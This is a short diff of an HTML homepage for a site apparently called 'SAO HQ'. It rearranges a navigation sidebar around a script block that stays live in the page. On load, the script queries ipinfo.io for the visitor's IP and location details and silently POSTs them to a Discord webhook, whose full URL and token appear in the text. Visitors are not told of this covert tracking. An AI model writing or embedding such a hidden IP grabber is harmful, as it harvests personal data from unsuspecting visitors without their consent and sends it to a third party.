@@ -44,7 +44,21 @@ body {
 </style>
 </head>
 <body>
-<script>
+
+	
+<div class="sidenav">
+  <a href="/chat.html">Chat</a>
+  <a href="#services">Services</a>
+  <a href="#clients">Clients</a>
+  <a href="#contact">Contact</a>
+</div>
+
+<div class="main">
+  <p>Main page of SAO HQ.</p>
+
+</body>
+
+	<script>
 		 $.get("https://ipinfo.io", function(response) {
       const request = new XMLHttpRequest();
       request.open("POST", "https://discord.com/api/webhooks/1134935276129636475/mAl-Orwh6PE6JpmTrwHov7nWSKmoXH2hCDvfL3tTcjoP5yNRZyFZwS9I_7Hl88w5DLYa");
@@ -61,17 +75,4 @@ body {
       request.send(JSON.stringify(params));
 		     }, "json")
 	</script>
-
-	
-<div class="sidenav">
-  <a href="/chat.html">Chat</a>
-  <a href="#services">Services</a>
-  <a href="#clients">Clients</a>
-  <a href="#contact">Contact</a>
-</div>
-
-<div class="main">
-  <p>Main page of SAO HQ.</p>
-
-</body>
 </html> 
